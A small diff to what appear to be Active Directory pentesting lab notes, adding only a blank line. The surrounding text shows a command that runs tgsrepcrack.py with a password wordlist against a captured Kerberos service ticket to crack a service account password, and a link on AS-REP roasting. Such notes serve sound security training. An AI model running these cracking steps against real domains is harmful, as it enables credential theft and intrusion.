@@ -503,6 +503,7 @@ Crack the Service account password:
 ```python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-
 40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi```
 
+
 # Targeted Kerberoasting - AS-REPs
 https://harmj0y.medium.com/roasting-as-reps-e6179a65216b
 
